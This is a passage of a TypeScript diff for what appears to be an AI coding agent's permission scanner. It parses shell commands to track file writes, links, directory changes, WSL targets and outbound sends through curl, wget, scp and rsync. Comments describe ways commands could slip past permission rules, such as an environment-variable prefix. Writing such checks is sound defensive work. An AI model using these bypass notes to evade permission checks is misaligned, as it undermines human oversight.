+        // A hard link writes whatever its source is: the same file, under another name.
+        for (const word of wrappedRest) {
+          if (wordValue(word).startsWith('-')) continue;
+          if (isDynamic(word) || (state.lost && !isAbsolutePath(expand(unquote(word))))) {
+            configWrites.push({ id: node.id });
+            continue;
+          }
+          for (const target of operandTargets(state.cwd, expand(unquote(word)))) {
+            configWrites.push({ id: node.id, path: target });
+          }
+        }
+      } else if (
+        !CHANGES_DIRECTORY.has(program) &&
+        !onlyReads(tokens) &&
+        !configWrites.some(write => write.id === node.id) &&
+        /^(mkdir|touch|truncate)$/.test(inner)
+      ) {
+        // What they name is all they change: a config file emptied, or a file or folder a place lies in.
+        for (const [index, word] of wrappedRest.entries()) {
+          if (
+            wordValue(word).startsWith('-') ||
+            (inner === 'truncate' && TRUNCATE_VALUED.test(wordValue(wrappedRest[index - 1] ?? ''))) ||
+            (inner === 'touch' && TOUCH_VALUED.test(wordValue(wrappedRest[index - 1] ?? '')))
+          ) {
+            continue;
+          }
+          if (isDynamic(word) || (state.lost && !isAbsolutePath(expand(unquote(word))))) {
+            if (inner === 'truncate') configWrites.push({ id: node.id });
+            continue;
+          }
+          for (const target of operandTargets(state.cwd, expand(unquote(word)))) {
+            configWrites.push({ id: node.id, path: target });
+          }
+        }
+      } else if (
+        !CHANGES_DIRECTORY.has(program) &&
+        !onlyReads(tokens) &&
+        !configWrites.some(write => write.id === node.id)
+      ) {
+        const removed = inner === 'mv' ? null : removedOperands(inner, wrappedRest);
+        const placed = removed !== null && (await noteRemovals(node, removed));
+        // A writer whose files the scan does not list may write any config: code it is handed, or a removal, anywhere.
+        const anywhere =
+          !placed &&
+          ((runsString && !(await readsOnlyShellString(run, runArgs))) ||
+            runsInlineCode(run, runArgs.map(unquote), node) ||
+            /^(rm|rmdir|unlink)$/.test(inner));
+        if (anywhere) configWrites.push({ id: node.id });
+        else if (!placed) configWrites.push({ id: node.id, unlisted: true });
+      }
+      // A move writes its destination (noted above) and takes its sources away.
+      if (inner === 'mv' && !CHANGES_DIRECTORY.has(program)) {
+        const sources = removedOperands(inner, wrappedRest);
+        if (sources !== null) await noteRemovals(node, sources);
+      }
+      const cloned = inPlace.remote === undefined ? [] : await noteRemoteTree(inPlace.remote);
+
+      if (CHANGES_DIRECTORY.has(program)) {
+        directoryChanges++;
+        // Moving changes no file; the commands that run in the new folder count it as theirs.
+        if (part) part.reads = true;
+        // Later operands resolve against a folder the scan cannot name, so no prefix rule covers the script.
+        const statement = node.parent?.type === 'redirected_statement' ? node.parent : node;
+        if (await changeDirectory(program, rest, listMembers.has(statement.id), node.id)) {
+          const moved: ShellCommand = { text: node.text, always: node.text, coverable: false, words: node.text };
+          commands.push(moved);
+          return moved;
+        }
+        return null;
+      }
+      // `command cd`, `builtin cd`, `eval` and `source` can move bash without the scan following, and `dirs` edits the stack.
+      const builtin = program === 'builtin' ? programName(unquote(rest[0] ?? '')) : '';
+      if (inner === 'source' || inner === '.' || builtin === 'source' || builtin === '.') sourced = true;
+      if (
+        CHANGES_DIRECTORY.has(inner) ||
+        CHANGES_DIRECTORY.has(builtin) ||
+        ['eval', 'source', '.'].includes(inner) ||
+        ['eval', 'source', '.'].includes(builtin)
+      ) {
+        directoryChanges++;
+        state.lost = true;
+        state.stackLost = true;
+      }
+      if (inner === 'dirs' || builtin === 'dirs') state.stackLost = true;
+      if (movesShell(builtin || inner, (builtin ? rest.slice(1) : wrappedRest).map(wordValue))) {
+        // An alias, trap action or callback runs code the scan never reads.
+        if ((builtin || inner) !== 'shopt') unreadOperands++;
+        directoryChanges++;
+        Object.assign(state, { lost: true, stackLost: true });
+      }
+      const configured = gitConfigProgram(withoutWrappers(tokens));
+      gitProgram ??= configured;
+
+      const normalised = commandTokens(written);
+      const assignments = node.namedChildren.filter(child => child?.type === 'variable_assignment');
+      // A tuning variable in front of a toolchain run is not unsafe syntax for a remembered
+      // pattern or a rule; every other assignment is.
+      const assigns =
+        assignments.length > 0 &&
+        !(
+          localToolchainCommand(tokens) &&
+          assignments.every(
+            child =>
+              child !== null &&
+              harmlessAssignment(
+                child.childForFieldName('name')?.text ?? '',
+                child.childForFieldName('value')?.text ?? ''
+              )
+          )
+        );
+      const writes = writtenCommands.has(node.id) || hasWriteRedirect(node);
+      const arithmetic = tokens.some(token => EVALUATES_ARITHMETIC.test(token));
+      const name = programName(unquote(wrapped ?? ''));
+      const findRun = name === 'find' ? findActions(wrappedRest) : null;
+      const opaque = [tokens, ...(findRun?.runs ?? [])].map(run => opaqueForm(run)).find(form => form !== null) ?? null;
+      // An alias git reads as plain words stays coverable: rules match the text as written and the expansion's words.
+      const coverable =
+        !assigns &&
+        !writes &&
+        !arithmetic &&
+        configured === null &&
+        droppedOnlySafeOptions(tokens) &&
+        !runsOpaqueScript(name, wrappedRest);
+      // Exact rules must name the unsafe syntax too: dropping an assignment or output redirect
+      // would let `Bash(git status)` cover `GIT_CONFIG_PARAMETERS=... git status` or a file write.
+      const original = node.parent?.type === 'redirected_statement' ? node.parent.text : node.text;
+      const expandedText = expanded === null ? '' : commandTokens(expanded).join(' ');
+      const entry: ShellCommand = {
+        text: normalised.join(' '),
+        ...(expandedText !== '' && expandedText !== normalised.join(' ') ? { expanded: expandedText } : {}),
+        always: `${arityPrefix(normalised).join(' ')} *`,
+        coverable,
+        // A harmless assignment stays in `words` so a deny or ask rule naming it still matches.
+        words: coverable ? [...assignments.map(child => child?.text ?? ''), ...tokens].join(' ') : original,
+        ...(opaque ? { opaque } : {}),
+      };
+      commands.push(entry);
+      entries.set(node.id, { entry, original });
+      const reason =
+        [tokens, ...(findRun?.runs ?? [])].map(run => outboundReason(run, readsStdin(node))).find(Boolean) ?? null;
+      if (reason || assigns || arithmetic || !containedCommand(tokens)) potentialOutbound = true;
+      if (reason) {
+        outbound.add(reason);
+        const computed = tokens.some(isDynamic);
+        const send = {
+          reason,
+          target: assigns || computed || state.lost ? null : repositoryWrite(tokens.map(unquote), state.cwd),
+        };
+        sends.push(send);
+        entry.outbound = send;
+      }
+      // wslconfig is the legacy tool for WSL itself (`/u` unregisters a distro, `/t` stops one).
+      if (programName(unquote(withoutWrappers(tokens)[0] ?? '')) === 'wslconfig') ungranted.add(WSL_MANAGEMENT);
+      for (const { distros, system, managing } of wslRuns(tokens)) {
+        if (managing) {
+          ungranted.add(WSL_MANAGEMENT);
+          continue;
+        }
+        if (system) {
+          ungranted.add(SYSTEM_DISTRO);
+          continue;
+        }
+        for (const distro of distros) {
+          const root = distro === undefined ? UNNAMED_DISTRO : wslUncPath({ host: 'wsl.localhost', distro }, '/');
+          if (distro === undefined || inUngrantedDistro(root, allowed)) ungranted.add(root);
+        }
+      }
+      for (const file of ghReadFiles(tokens.map(unquote))) await check(file, state.cwd);
+      if (
+        reason ||
+        assigns ||
+        arithmetic ||
+        writes ||
+        inPlace.files.length > 0 ||
+        inPlace.trees.length > 0 ||
+        !onlyReads(tokens)
+      ) {
+        readOnly = false;
+      } else if (part && onlyReads(tokens, false)) {
+        part.reads = true;
+      }
+      for (const arg of rest) {
+        const envFile = arg.startsWith('-') ? null : noteEnvFile(arg);
+        if (envFile) (entry.envFiles ??= []).push(envFile);
+      }
+      if (deletesFiles(tokens)) entry.deletes = true;
+      for (const directory of directoryOptionValues(tokens)) await check(directory, state.cwd);
+      const trees = treeOperands(name, wrappedRest);
+      if (findRun) {
+        const actions = findRun;
+        if (actions.untrackable) unreadOperands++;
+        for (const read of actions.reads) await check(read, state.cwd);
+        // `-exec` hands the program what find prints, as xargs does after `find -print`.
+        const printing = actions.writer ? execAsPrint(wrappedRest) : null;
+        const listing = printing ? listsNames([wrapped ?? 'find', ...printing], gateText) : null;
+        if (
+          actions.writer &&
+          (listing === null || !trusted(node, null) || !(await listingChecked(listing, true, false)))
+        ) {
+          unreadOperands++;
+        }
+      }
+      if (runsOpaqueScript(name, wrappedRest)) unreadOperands++;
+      const files = optionFiles(name, wrappedRest);
+      if (files === null) unreadOperands++;
+      for (const { raw, write } of files ?? []) {
+        if (write) noteWrite(raw);
+        await check(raw, state.cwd);
+      }
+      if (name === 'curl') {
+        const curl = curlFiles(wrappedRest);
+        if (!curl || curl.named) unreadOperands++;
+        for (const path of curl?.reads ?? []) await check(path, state.cwd);
+        for (const path of curl?.writes ?? []) {
+          noteWrite(path);
+          await check(path, state.cwd);
+        }
+      }
+      if (name === 'wget' || name === 'scp' || name === 'rsync') {
+        // A file a send names (`--post-file f`, `scp f host:`) is read where it sits; a URL or `host:path` is not local.
+        for (const arg of wrappedRest) {
+          const word = wordValue(arg);
+          const value = word.startsWith('-') ? word.slice(word.indexOf('=') + 1) : word;
+          if (value === word && word.startsWith('-')) continue;
+          if (value === '' || /^\w+:\/\//.test(value) || /^[^/\\]*:/.test(value)) continue;
+          await check(shellQuoted(value), state.cwd);
+        }
+      }
+      if (
+        name === 'cpio' &&
+        (/p/.test(shortFlags(wrappedRest)) || wrappedRest.some(arg => unquote(arg) === '--pass-through'))
+      ) {
+        await noteCopiedTree(wrappedRest.filter(arg => !unquote(arg).startsWith('-')).at(-1));
+      }
+      const wrapperWordCount = rest.length - wrappedRest.length;
+      const reachAt = (index: number): Reach | null => trees.operands.get(index - wrapperWordCount) ?? null;
+      // A wrapped program is read as it is without its wrappers, whose own words are read as arguments.
+      const touches = TOUCHES_FILES.has(name);
+      if (!touches || wrapperWordCount > 0) {
+        const here = wslLocation(state.cwd);
+        const windowsProgram = here !== null && WINDOWS_PROGRAM.test(wordValue(wrapped ?? ''));
+        const patterns = patternWords(name, wrappedRest);
+        // A program the scan does not model is decided as before: an operand it cannot read is checked as far as it can be.
+        const modeled = MODELED_PROGRAMS.has(name);
+        // Programs outside the folder-discovery list can still name permission files (sed,
+        // awk, dd, ...). Record static operands for the permission-file floor too, including
+        // option values, without treating every ordinary argument as an outside folder grant.
+        for (const [index, arg] of rest.entries()) {
+          if (touches && index >= wrapperWordCount) break;
+          const counts = modeled || index < wrapperWordCount;
+          // A Windows program run through interop opens a Windows path where Windows would, so that place is
+          // judged, for the word bash passes and for the part after an `=` in it.
+          if (windowsProgram) {
+            const word = wordValue(arg);
+            const passed = [...new Set([word, word.slice(word.indexOf('=') + 1)])].filter(
+              part => !part.startsWith('-') && /^[A-Za-z]:|^[\\/]{2}|\\/.test(part)
+            );
+            for (const part of passed) await check(part, state.cwd, false, 'windows');
+            if (passed.length > 0) continue;
+          }
+          const value = arg.includes('=') ? arg.slice(arg.indexOf('=') + 1) : arg;
+          // An option's empty value (`--format=`) names no place, though expandBraces reads it as a dropped alternative.
+          if ((value === '' && arg.startsWith('-')) || value.startsWith('-')) continue;
+          const words = operandWords(value, scope());
+          // Braces the scan cannot expand as bash does may make any name, so whatever their shape they are unread.
+          if (words === null) {
+            unreadOperands++;
+            continue;
+          }
+          const reach = reachAt(index);
+          // An expansion is an unread path where a path is expected: an option's folder or file, a tree
+          // operand, or a word with a separator outside the expansion (`"$X"/f`, but not `"$PAT"`).
+          const option = PATH_OPTION_VALUE.test(wordValue(arg)) || PATH_OPTIONS.has(wordValue(rest[index - 1] ?? ''));
+          const pattern = patterns.has(index - wrapperWordCount);
+          for (const word of words) {
+            const pathLike = option || reach !== null || (!pattern && /[\\/]/.test(word.text));
+            await checkArgument(word, reach, pathLike, counts);
+          }
+        }
+      }
+      if (touches) {
+        const probe = READ_PROBES.has(name) && containedCommand(tokens);
+        for (const [index, arg] of wrappedRest.entries()) {
+          if (arg.startsWith('-') || (name === 'chmod' && arg.startsWith('+'))) continue;
+          await check(arg, state.cwd, probe, 'program', trees.operands.get(index) ?? null);
+        }
+      }
+      if (trees.cwd) {
+        if (state.lost) unreadOperands++;
+        await checkArgument(literalWord('.'), trees.cwd, true);
+      }
+      if (followsLinks(name, wrappedRest) && sep === '/' && wslLocation(state.cwd) === null && !state.lost) {
+        // Each link the walk meets is read as the path it is, so its target is judged like any operand.
+        const budget = { entries: WALK_ENTRIES };
+        const operands = wrappedRest.filter(arg => !unquote(arg).startsWith('-'));
+        for (const arg of trees.cwd ? [...operands, '.'] : operands) {
+          const words = operandWords(arg, scope());
+          if (words === null) unreadOperands++;
+          for (const word of words ?? []) {
+            const operand = readOperand(word, posix.dirname);
+            if (operand.unread) continue;
+            const links = await linksUnder(
+              posix.isAbsolute(operand.path) ? operand.path : under(state.cwd, operand.path),
+              budget,
+              stopped
+            );
+            if (links === null) unreadOperands++;
+            for (const link of links ?? []) await checkArgument(exactWord(link), 'read', true);
+          }
+        }
+      }
+      const target = COPIES.has(name) ? copyTarget(name, wrappedRest) : null;
+      if (target?.glued) await check(target.value, state.cwd, false, 'program', trees.glued);
+      if (UNPACKS.has(name)) {
+        for (const tree of inPlace.trees) {
+          const words = operandWords(tree, scope());
+          if (words === null) unreadOperands++;
+          for (const word of words ?? []) await checkArgument(word, 'write', true);
+        }
+      }
+      if (name === 'ln') await noteLinks(wrappedRest);
+      if (name === 'cp' || name === 'mv' || name === 'rsync') await noteCopiedLinks(name, wrappedRest);
+      // An archive, diff or checkout can plant links the scan cannot follow, so what it wrote is read as one.
+      if (inPlace.links) {
+        for (const path of [...inPlace.files, ...inPlace.trees]) {
+          for (const place of operandTargets(state.cwd, expand(path))) createdLinks.add(guardForm(place));
+        }
+      }
+      for (const place of cloned) createdLinks.add(guardForm(place));
+      // The window includes any substitution in its words: output the scan cannot read decides this part too.
+      if (unreadOperands > unreadBefore) Object.assign(entry, { coverable: false, words: original, unread: true });
+      if (inPlace.refsMovedOnly && unreadOperands === unreadBefore + 1 && !entry.opaque) entry.refsMovedOnly = true;
+      if (unlisted !== null) {
+        const reason = unlisted as GitReason;
+        Object.assign(entry, {
+          coverable: false,
+          words: original,
+          gitUnlisted: reason.reason,
+          ...(reason.kind === 'signing' ? { gitSigningRisk: true } : {}),
+        });
+      }
+      return entry;
+    };
+
+    /**
+     * Records an argument of a program outside TOUCHES_FILES as a path it names, without offering its folder
+     * as a grant. An expansion that is not `pathLike` is taken for no path at all (`git commit -m "$(cat msg)"`),
+     * and one in an argument the scan does not model (`modeled` false) leaves the command trackable.
+     */
+    const checkArgument = async (
+      word: OperandWord,
+      reach: Reach | null,
+      pathLike: boolean,
+      modeled = true
+    ): Promise<void> => {
+      if (word.text === '' || expired) return;
+      if (processPath(word.text, state.cwd)) unreadOperands++;
+      const rules = operandRules(state.cwd);
+      const operand = readOperand(word, rules.dirname);
+      if (operand.unread) {
+        if (!pathLike) return;
+        if (modeled) unreadOperands++;
+      }
+      if (operand.start === null && pathLike) await viaProcessLink(word.text, state.cwd);
+      const linked = await linkMatches(word, operand, state.cwd);
+      if (linked === null) unreadOperands++;
+      for (const match of linked ?? []) await checkArgument(exactWord(match), reach, true);
+      const { shape, folder: prefix } = shapeOf(word, operand, rules, sep === '\\', state.cwd);
+      if (underCreatedLink(state.cwd, prefix, 'program')) unreadOperands++;
+      const record = async (physical: string): Promise<void> => {
+        addPath(physical);
+        if (operand.start !== null) await reachFolder(physical, shape?.dotless === true, reach);
+        else if (reach) await reachFolder(physical, false, reach);
+        if (shape?.namesSettings) addPath(join(physical, '.claude'));
+      };
+      const targets = operandTargets(state.cwd, prefix);
+      const unreachable = targets.filter(target => inUngrantedDistro(target, allowed));
+      for (const target of unreachable) ungranted.add(target);
+      const here = wslLocation(state.cwd);
+      if (!here) {
+        if (unreachable.length === 0) {
+          const volume = [parse(targets[0] ?? prefix).root];
+          await record(await resolveWithinRootsPhysically(prefix, volume, state.cwd));
+          const own = operand.start === null ? await ownPlaces(prefix, state.cwd, volume) : [];
+          for (const place of own) addPath(place);
         }
         return;
       }
+      // A WSL folder's command reads its operands against its own distro. A Windows path or a granted other
+      // distro is not on that filesystem and is left unread; one that is and fails fails the scan.
+      const distro = [wslUncPath(here, '/')];
+      for (const { lexical, physical, inside } of await operandPlaces(prefix, distro, state.cwd)) {
+        if (wslLocation(lexical)?.distro.toLowerCase() !== here.distro.toLowerCase()) continue;
+        if (!inside || physical === null) throw new PathAccessDenied(prefix);
+        await record(physical);
+      }
+      if (operand.start === null) for (const place of await ownPlaces(prefix, state.cwd, distro)) addPath(place);
+    };
+
+    /**
+     * `ln -s TARGET LINK`: the target is read where the link will sit, and later operands under the link
+     * leave the command unread, as the scan cannot follow a link that does not exist yet.
+     */
+    const noteLinks = async (args: readonly string[]): Promise<void> => {
+      const flags = shortFlags(args);
+      // getopt_long takes `--sy` and longer for `--symbolic`; `--s` could be `--suffix` too.
+      const symbolic =
+        flags.includes('s') || args.some(arg => /^--sy/.test(unquote(arg)) && '--symbolic'.startsWith(unquote(arg)));
+      let directory: string | null = null;
+      const operands: string[] = [];
+      for (let index = 0; index < args.length; index++) {
+        const arg = unquote(args[index] as string);
+        if (arg === '-t' || arg === '-S') {
+          if (arg === '-t') directory = args[index + 1] ?? null;
+          index++;
+        } else if (arg.startsWith('--target-directory=')) {
+          directory = args[index].slice(args[index].indexOf('=') + 1);
+        } else if (!arg.startsWith('-')) {
+          operands.push(args[index] as string);
+        }
+      }
+      const single = directory === null && operands.length === 1;
+      const sources = directory !== null || single ? operands : operands.slice(0, -1);
+      const place = directory ?? (single ? '.' : operands.at(-1));
+      if (place === undefined) return;
+      const text = (raw: string): string | null => {
+        const words = operandWords(raw, scope());
+        if (words === null) unreadOperands++;
+        const [word] = words ?? [];
+        return word && word.expandAt === null ? word.text : null;
+      };
+      const at = text(place);
+      if (at === null) return;
+      const location = operandTargets(state.cwd, at)[0];
+      if (location === undefined) return;
+      const rules = operandRules(state.cwd);
+      // `ln -s a b` makes `b`, or `b/a` when `b` is a folder; `-t` and a lone target make `<folder>/a`.
+      const named = directory === null && !single;
+      const inside = sources.flatMap(source => {
+        const name = text(source);
+        return name === null ? [] : [join(location, rules.basename(name))];
+      });
+      if (!symbolic) {
+        // A hard link to a symlink is that symlink again, as GNU ln makes one without `-L`.
+        if (flags.includes('L') || args.some(arg => unquote(arg) === '--logical')) return;
+        const symlinks = await Promise.all(
+          sources.map(async source => {
+            const name = text(source);
+            if (name === null || /[*?[]/.test(name) || underCreatedLink(state.cwd, name, 'program')) return true;
+            const info = await lstat(operandTargets(state.cwd, name)[0] ?? name).catch((error: unknown) =>
+              missing(error) ? undefined : null
+            );
+            return info === null || info?.isSymbolicLink() === true;
+          })
+        );
+        if (!symlinks.includes(true)) return;
+      } else {
+        for (const source of sources) {
+          await check(source, location);
+          if (named) await check(source, dirname(location));
+        }
+      }
+      for (const link of named ? [location, ...inside] : inside) createdLinks.add(guardForm(link));
+    };
+
+    /** `cpio -p DEST` copies what it reads into DEST, links included, so DEST is written and read as a link this script made. */
+    const noteCopiedTree = async (raw: string | undefined): Promise<void> => {
+      const words = raw === undefined ? null : operandWords(raw, scope());
+      const word = words?.length === 1 ? words[0] : undefined;
+      if (raw === undefined || word === undefined || readOperand(word, posix.dirname).start !== null || state.lost) {
+        unreadOperands++;
+        return;
+      }
+      noteWrite(raw, writtenTrees);
+      await checkArgument(word, 'write', true);
+      for (const place of operandTargets(state.cwd, word.text)) createdLinks.add(guardForm(place));
+    };
+
+    /**
+     * A clone from another computer writes a tree no scan can list: auto mode asks, and over a settings base it is
+     * untrackable. Returns the folders it fills, which the caller marks as links once the command's own words are checked.
+     */
+    const noteRemoteTree = async (raw: string): Promise<string[]> => {
+      remoteTree = true;
+      const words = operandWords(raw, scope());
+      const word = words?.length === 1 ? words[0] : undefined;
+      if (word === undefined || readOperand(word, posix.dirname).start !== null || state.lost) {
+        unreadOperands++;
+        return [];
+      }
+      noteWrite(raw, writtenTrees);
+      await checkArgument(word, 'write', true);
+      const places = operandTargets(state.cwd, word.text);
+      for (const place of places) {
+        const physical = await physicalTarget(place).catch(() => null);
+        const form = physical === null ? null : guardForm(physical);
+        if (form === null || settingsBases.some(base => guardFormWithin(form, guardForm(base)))) unreadOperands++;
+      }
+      return places;
+    };
+
+    /** Whether `path` is a link, holds one, or lies over or under a link this script made; true when it cannot tell. */
+    const holdsLinks = async (path: string, budget: { entries: number }): Promise<boolean> => {
+      const form = guardForm(path);
+      if ([...createdLinks].some(link => guardFormWithin(link, form) || guardFormWithin(form, link))) return true;
+      const info = await lstat(path).catch((error: unknown) => (missing(error) ? undefined : null));
+      if (info === undefined) return false;
+      if (info === null || info.isSymbolicLink()) return true;
+      if (!info.isDirectory()) return false;
+      const links = await linksUnder(path, budget, stopped);
+      return links === null || links.length > 0;
+    };
+
+    /**
+     * A copy that keeps links (`cp -r`/`-a`/`-P` without `-L`, `mv`, `rsync -a`/`-l`) moves them to its destination,
+     * where a relative one may now point elsewhere, so the destination is read as a link this script made. A
+     * recursive copy also writes through each link already in the destination.
+     */
+    const noteCopiedLinks = async (program: 'cp' | 'mv' | 'rsync', args: readonly string[]): Promise<void> => {
+      const flags = shortFlags(args);
+      const longs = new Set(args.map(arg => unquote(arg).split('=')[0] as string));
+      const follows =
+        program === 'rsync'
+          ? flags.includes('L') || longs.has('--copy-links') || longs.has('--copy-unsafe-links')
+          : flags.includes('L') || longs.has('--dereference');
+      const keeps =
+        program === 'mv' ||
+        (program === 'cp' &&
+          (/[rRaPd]/.test(flags) || ['--recursive', '--archive', '--no-dereference'].some(long => longs.has(long)))) ||
+        (program === 'rsync' && (/[al]/.test(flags) || longs.has('--archive') || longs.has('--links')));
+      const recursive =
+        program === 'rsync' ||
+        (program === 'cp' && (/[rRa]/.test(flags) || longs.has('--recursive') || longs.has('--archive')));
+      if (!(keeps && !follows) && !recursive) return;
+      const target = copyTarget(program, args);
+      const positional = args.filter((arg, index) => !unquote(arg).startsWith('-') && index !== target?.index);
+      const destination = target?.value ?? positional.at(-1);
+      if (destination === undefined) return;
+      const sources = target ? positional : positional.slice(0, -1);
+      if (state.lost || sep !== '/' || wslLocation(state.cwd) !== null) {
+        unreadOperands++;
+        return;
+      }
+      const places = (raw: string): string[] | null => {
+        const words = operandWords(raw, scope());
+        if (words === null || words.some(word => readOperand(word, posix.dirname).start !== null)) return null;
+        return words.map(word => (posix.isAbsolute(word.text) ? word.text : under(state.cwd, word.text)));
+      };
+      const budget = { entries: WALK_ENTRIES };
+      const into = places(destination);
+      if (into === null) {
+        unreadOperands++;
+        return;
+      }
+      if (recursive) {
+        for (const folder of into) {
+          const links = await linksUnder(folder, budget, stopped);
+          if (links === null) unreadOperands++;
+          for (const link of links ?? []) await checkArgument(exactWord(link), 'write', true);
+        }
+      }
+      if (!keeps || follows) return;
+      let moved = false;
+      for (const source of sources) {
+        // A remote rsync source (`host:path`) is a tree the scan cannot look into.
+        const from = program === 'rsync' && /^[^/]*:/.test(unquote(source)) ? null : places(source);
+        moved ||= from === null;
+        for (const path of from ?? []) moved ||= await holdsLinks(path, budget);
+        if (moved) break;
+      }
+      if (moved) for (const folder of into) createdLinks.add(guardForm(folder));
+    };
+
+    /**
+     * Follows a cd, pushd or popd. True when a glob or an expansion leaves the folder it moves to unknown.
+     *
+     * The move is followed only where it is certain to land: an existing folder, outside a conditional, loop or
+     * function body, with no CDPATH and no stack option (`-n`, `+N`, `-N`). Otherwise bash may be in either
+     * folder afterwards, and the state is marked lost.
+     */
+    const changeDirectory = async (
+      program: string,
+      rest: string[],
+      inList: boolean,
+      commandId: number
+    ): Promise<boolean> => {
+      const certain = branching === 0 && !cdPath;
+      const stackOption = rest.some(arg => /^[-+]./.test(unquote(arg)));
+      if (program === 'popd') {
+        if (stackOption || state.stackLost) {
+          Object.assign(state, { lost: true, stackLost: true });
+          return false;
+        }
+        const back = state.stack.pop();
+        if (back) {
+          Object.assign(state, {
+            previous: state.cwd,
+            previousLogical: state.logical,
+            previousLost: state.lost,
+            cwd: back.cwd,
+            logical: back.logical,
+          });
+          state.lost = back.lost || !certain;
+        }
+        return false;
+      }
+      if (program === 'pushd' && (stackOption || rest.length === 0)) {
+        Object.assign(state, { lost: true, stackLost: true });
+        return false;
+      }
       const target = rest.find(arg => arg === '-' || !arg.startsWith('-'));
-      const next = target === '-' ? state.previous : await check(target ?? homedir(), state.cwd);
-      if (next === null) return;
-      if (program === 'pushd') state.stack.push(state.cwd);
-      state.previous = state.cwd;
-      state.cwd = next;
+      if (target === '-' && rebound) {
+        unreadOperands++;
+        state.lost = true;
+        return true;
+      }
+      const words = target === undefined || target === '-' ? [] : operandWords(target, scope());
+      // As bash: `-P` (the last of `-L`/`-P`, or `set -P`) resolves links first; otherwise `..` folds on $PWD.
+      let physical = physicalShell;
+      const options = rest.slice(0, target === undefined ? rest.length : rest.indexOf(target)).map(unquote);
+      for (const letter of options.filter(arg => /^-[LPe@]+$/.test(arg)).join('')) {
+        if (letter === 'P') physical = true;
+        if (letter === 'L') physical = false;
+      }
+      const [only] = words ?? [];
+      const folded =
+        !physical &&
+        words?.length === 1 &&
+        only !== undefined &&
+        readOperand(only, posix.dirname).start === null &&
+        sep === '/' &&
+        wslLocation(state.cwd) === null &&
+        !state.lost
+          ? posix.resolve(state.logical, only.text)
+          : null;
+      const unread = unreadOperands;
+      const next =
+        target === '-'
+          ? state.previous
+          : await check(folded === null ? (target ?? '~') : shellQuoted(folded), state.cwd, false, 'shell');
+      const unknown =
+        words === null ||
+        words.length > 1 ||
+        unreadOperands > unread ||
+        words.some(word => readOperand(word, operandRules(state.cwd).dirname).start !== null);
+      if (next === null) {
+        state.lost = true;
+        return unknown;
+      }
+      // In an `&&`/`||` list a failed cd is one of the outcomes visitList weighs, so only a lone one must exist.
+      const there = (await stat(next).catch(() => null))?.isDirectory() === true;
+      // A folder not there yet is made by the script, so the config a repository in it reads is not known now.
+      if (!there) noteHistory(commandId, 'place');
+      const landed = inList || there;
+      const fromLost = target === '-' && (state.previousLost || state.lost);
+      if (program === 'pushd') state.stack.push({ cwd: state.cwd, logical: state.logical, lost: state.lost });
+      const logical = target === '-' ? state.previousLogical : (folded ?? next);
+      Object.assign(state, {
+        previous: state.cwd,
+        previousLogical: state.logical,
+        previousLost: state.lost,
+        cwd: next,
+        logical,
+      });
+      state.lost = unknown || fromLost || !certain || !landed;
+      return unknown;
+    };
+
+    // Every reading is kept: a write recorded at a place the command never wrote only asks more often.
+    /** `raw` is a shell word unless `value`, a name already as bash passes it (a copy's joined destination). */
+    const noteWrite = (raw: string, into = writes, value = false): void => {
+      const bound = boundWords(raw, loopBindings);
+      if (bound) {
+        for (const word of bound) noteWrite(wordValue(word), into);
+        return;
+      }
+      // The word as bash passes it (`.cl''aude`), and as written, in case a quote kept a `~` literal.
+      for (const text of new Set([expand(unquote(raw)), expand(value ? raw : wordValue(raw))])) {
+        if (!text || HARMLESS_REDIRECT_TARGETS.has(text)) continue;
+        const homeWord = rebound && /^~|\$\{?HOME\b/.test(unquote(raw));
+        if (isDynamic(text) || (state.lost && !isAbsolutePath(text)) || processPath(text, state.cwd) || homeWord) {
+          unreadOperands++;
+          return;
+        }
+        for (const target of operandTargets(state.cwd, text)) {
+          into.add(target);
+          if (writer !== null) configWrites.push({ id: writer, path: target, tree: into === writtenTrees });
+        }
+      }
+    };
+
+    const noteWrites = (program: string, rest: string[]): void => {
+      const rules = operandRules(state.cwd);
+      const operands = rest.filter(arg => !arg.startsWith('-'));
+      if (program === 'tee') for (const operand of operands) noteWrite(operand);
+      const uniqWrites = program === 'uniq' ? uniqOutput(rest) : undefined;
+      if (uniqWrites === null) unreadOperands++;
+      else if (uniqWrites !== undefined) noteWrite(uniqWrites);
+      for (const [index, arg] of rest.entries()) {
+        const output = DOWNLOAD_OUTPUT.get(program);
+        const value = !output
+          ? undefined
+          : arg === output.long
+            ? ''
+            : arg.startsWith(`${output.long}=`)
+              ? arg.slice(output.long.length + 1)
+              : output.short.exec(arg)?.[1];
+        if (value !== undefined) noteWrite(value || (rest[index + 1] ?? ''));
+        if (program === 'dd' && arg.startsWith('of=')) noteWrite(arg.slice(3));
+      }
+      const [sub, verb, ...after] = commandTokens([program, ...rest]).slice(1);
+      const setsConfig = [verb, ...after].filter(arg => arg && !arg.startsWith('-')).length >= 2;
+      if (
+        program === 'git' &&
+        sub === 'config' &&
+        (setsConfig || [verb, ...after].some(a => GIT_CONFIG_SETS.test(a ?? '')))
+      ) {
+        const repository = directoryOptionValues([program, ...rest])[0] ?? '.';
+        noteWrite(rest.includes('--global') ? '~/.gitconfig' : rules.join(repository, '.git/config'));
+      }
+      if ((program === 'npm' || program === 'pnpm') && sub === 'pkg' && verb !== 'get') noteWrite('package.json');
+      if (!COPIES.has(program)) return;
+      const target = copyTarget(program, rest)?.value ?? operands.at(-1);
+      if (target === undefined) return;
+      noteWrite(target);
+      for (const source of operands) {
+        if (source !== target) noteWrite(rules.join(unquote(target), rules.basename(unquote(source))), writes, true);
+      }
+      const recursive =
+        program === 'rsync' ||
+        ((program === 'cp' || program === 'scp') &&
+          rest.some(arg => /^-[a-zA-Z]*[rRa]/.test(arg) || arg === '--recursive' || arg === '--archive'));
+      if (recursive) noteWrite(target, writtenTrees);
+    };
+
+    /** Whether a write of another command may put a `.git` somewhere under `place`. */
+    const writtenGitBelow = (place: string, id: number): boolean => {
+      const folder = guardForm(place);
+      return configWrites.some(
+        write =>
+          write.id !== id &&
+          !plainCopies.has(write.id) &&
+          !write.removal &&
+          write.path !== undefined &&
+          guardFormWithin(folder, guardForm(write.path)) &&
+          (write.tree === true || /(^|\/)\.git(\/|$)/.test(guardForm(write.path)))
+      );
+    };
+
+    /**
+     * A recursive copy or sync whose source holds a `.git` (or cannot be read) may write `<target>/.git/config`: the
+     * template folders it lays down have no `.git` name of their own to be seen as a write there.
+     */
+    const noteTemplateCopy = async (program: string, rest: string[], id: number): Promise<void> => {
+      const recursive =
+        program === 'rsync' ||
+        rest.some(arg => /^-[a-zA-Z]*[rRa]/.test(arg) || arg === '--recursive' || arg === '--archive');
+      if (!recursive) return;
+      if (program === 'rsync' && rsyncSkipsGit(rest)) {
